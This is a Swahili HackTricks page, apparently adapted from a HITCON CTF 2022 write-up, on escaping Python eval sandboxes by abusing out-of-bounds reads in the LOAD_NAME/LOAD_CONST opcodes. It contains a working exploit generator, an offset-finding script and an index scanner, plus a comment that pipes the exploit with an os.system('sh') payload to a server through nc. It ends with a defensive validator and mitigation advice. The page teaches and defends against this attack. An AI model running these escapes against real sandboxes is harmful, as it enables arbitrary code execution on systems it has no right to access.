# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**Taarifa hii ilichukuliwa** [**kutoka kwenye writeup hii**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Tunaweza kutumia kipengele cha OOB read katika LOAD_NAME / LOAD_CONST opcode kupata symbol fulani kwenye memory. Hii inamaanisha kutumia mbinu kama `(a, b, c, ... hundreds of symbol ..., __getattribute__) if [] else [].__getattribute__(...)` ili kupata symbol (kama vile jina la function) unalotaka.

Kisha tengeneza exploit yako.

### Muhtasari <a href="#overview-1" id="overview-1"></a>

Source code ni fupi sana, ina mistari 4 tu!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Unaweza kuingiza Python code yoyote, na itacompile kuwa [Python code object](https://docs.python.org/3/c-api/code.html). Hata hivyo, `co_consts` na `co_names` za code object hiyo zitabadilishwa kuwa tuple tupu kabla ya ku-eval code object hiyo.

Kwa njia hii, expressions zote zilizo na consts (k.m. numbers, strings, n.k.) au names (k.m. variables, functions) zinaweza kusababisha segmentation fault mwishowe.

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Segfault hutokeaje?

Tuanze na mfano rahisi: `[a, b, c]` inaweza ku-compile kuwa bytecode ifuatayo.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Lakini vipi ikiwa `co_names` itakuwa tuple tupu? Opcode ya `LOAD_NAME 2` bado itatekelezwa, na kujaribu kusoma value kutoka kwenye memory address ambayo ilipaswa kuwa hapo awali. Ndiyo, hii ni "out-of-bound read feature".

Dhana kuu ya solution ni rahisi. Baadhi ya opcodes katika CPython, kwa mfano `LOAD_NAME` na `LOAD_CONST`, zinaweza kuwa vulnerable (?) kwa OOB read.

Zinapata object kutoka kwenye index `oparg` ya tuple ya `consts` au `names` (hivyo ndivyo `co_consts` na `co_names` zinavyoitwa internally). Tunaweza kurejelea snippest fupi ifuatayo kuhusu `LOAD_CONST` ili kuona CPython hufanya nini inapochakata opcode ya `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Kwa njia hii tunaweza kutumia kipengele cha OOB kupata `"name"` kutoka kwenye memory offset yoyote. Ili kuhakikisha ina `name` gani na offset yake ni ipi, endelea kujaribu `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... Na unaweza kupata kitu kwenye oparg > 700. Unaweza pia kujaribu kutumia gdb kuangalia mpangilio wa memory, bila shaka, lakini sidhani kama itakuwa rahisi zaidi?

### Kutengeneza Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Baada ya kupata hizo offsets muhimu za names / consts, tunapataje name / const kutoka kwenye offset hiyo na kuitumia? Hii hapa ni trick:\
Tuchukulie kwamba tunaweza kupata `__getattribute__` name kutoka offset 5 (`LOAD_NAME 5`) tukiwa na `co_names=()`, basi fanya mambo yafuatayo:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Kumbuka kwamba si lazima kuiita `__getattribute__`; unaweza kuiita kwa jina fupi zaidi au la kushangaza zaidi.

Unaweza kuelewa sababu yake kwa kuangalia tu bytecode yake:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Notice kwamba `LOAD_ATTR` pia hupata name kutoka `co_names`. Python hupakia names kutoka offset ileile ikiwa name ni ileile, kwa hivyo `__getattribute__` ya pili bado hupakiwa kutoka offset=5. Kwa kutumia kipengele hiki, tunaweza kutumia name yoyote mara tu name hiyo inapokuwa kwenye memory iliyo karibu.

Kutengeneza numbers kunapaswa kuwa rahisi:

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Sikutumia consts kwa sababu ya kikomo cha urefu.

Kwanza, hii ni script ya kutusaidia kupata offsets za names.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
Na ifuatayo ni kwa ajili ya kutengeneza exploit halisi ya Python.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Kimsingi hufanya mambo yafuatayo, kwa strings hizo tunazipata kutoka kwenye method ya `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Maelezo ya matoleo na opcodes zilizoathiriwa (Python 3.11–3.13)

- Bytecode ya CPython bado hutumia nambari za operands ku-index kwenye tuples za `co_consts` na `co_names`. Ikiwa attacker anaweza kulazimisha tuples hizi ziwe tupu (au ziwe ndogo kuliko index ya juu zaidi inayotumiwa na bytecode), interpreter itasoma memory iliyo nje ya mipaka kwa index hiyo, na kupata pointer ya PyObject kiholela kutoka memory iliyo karibu. Opcodes zinazohusika ni pamoja na:
- `LOAD_CONST consti` → husoma `co_consts[consti]`.
- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → husoma majina kutoka `co_names[...]` (kwa 3.11+ kumbuka kuwa `LOAD_ATTR`/`LOAD_GLOBAL` huhifadhi flag bits katika low bit; index halisi ni `namei >> 1`). Tazama nyaraka za disassembler kwa semantics kamili kulingana na toleo. [Python dis docs].<sup>[[2]](#references)</sup>
- Python 3.11+ ilianzisha adaptive/inline caches zinazoongeza entries zilizofichika za `CACHE` kati ya instructions. Hili halibadilishi primitive ya OOB; linamaanisha tu kwamba ukitengeneza bytecode wewe mwenyewe, lazima uzingatie entries hizo za cache wakati wa kuunda `co_code`.

Maana ya kiutendaji: technique iliyo kwenye ukurasa huu inaendelea kufanya kazi kwenye CPython 3.11, 3.12 na 3.13 unapoweza kudhibiti code object (kwa mfano, kupitia `CodeType.replace(...)`) na kupunguza `co_consts`/`co_names`.

### Scanner ya haraka ya indexes muhimu za OOB (inayoendana na 3.11+/3.12+)

Ikiwa unapendelea kuchunguza objects zinazovutia moja kwa moja kutoka kwenye bytecode badala ya kutumia source ya kiwango cha juu, unaweza kuunda code objects ndogo na kujaribu indexes kwa brute force. Helper iliyo hapa chini huingiza inline caches kiotomatiki inapohitajika.
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Notes
- Ili kuchunguza names badala yake, badilisha `LOAD_CONST` na `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` na urekebishe matumizi ya stack ipasavyo.
- Tumia `EXTENDED_ARG` au bytes nyingi za `arg` ili kufikia indexes >255 inapohitajika. Unapotengeneza kwa kutumia `dis` kama ilivyo hapo juu, unadhibiti byte ya chini pekee; kwa indexes kubwa, tengeneza raw bytes mwenyewe au gawanya attack katika loads nyingi.

### Minimal bytecode-only RCE pattern (co_consts OOB → builtins → eval/input)

Baada ya kutambua index ya `co_consts` inayorejelea builtins module, unaweza kuunda upya `eval(input())` bila `co_names` yoyote kwa kuendesha stack:
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Mbinu hii ni muhimu katika challenges zinazokupa udhibiti wa moja kwa moja wa `co_code` huku zikilazimisha `co_consts=()` na `co_names=()` (kwa mfano, BCTF 2024 “awpcode”). Huepuka tricks za kiwango cha source na huweka ukubwa wa payload kuwa mdogo kwa kutumia bytecode stack ops na tuple builders.

### Defensive checks na mitigations kwa sandboxes

Ikiwa unaandika Python “sandbox” inayocompile/evaluate code isiyoaminika au inayobadilisha code objects, usitegemee CPython kuangalia mipaka ya tuple indexes zinazotumiwa na bytecode. Badala yake, validate code objects mwenyewe kabla ya kuzi-execute.

Practical validator (inakataa OOB access kwa co_consts/co_names)
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Mawazo ya ziada ya mitigation
- Usiruhusu `CodeType.replace(...)` ya kiholela kwenye input isiyoaminika, au ongeza ukaguzi mkali wa muundo wa code object inayotokana.
- Fikiria kuendesha code isiyoaminika katika process tofauti yenye OS-level sandboxing (seccomp, job objects, containers) badala ya kutegemea semantics za CPython.

## Marejeleo

- [1] [Writeup ya HITCON CTF 2022 ya Splitline "V O I D" (chanzo cha technique hii na exploit chain ya kiwango cha juu)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Nyaraka za Python disassembler (semantics za indices za LOAD_CONST/LOAD_NAME/etc., na flags za low-bit za `LOAD_ATTR`/`LOAD_GLOBAL` katika 3.11+)](https://docs.python.org/3.13/library/dis.html)

{{#include ../../../banners/hacktricks-training.md}}
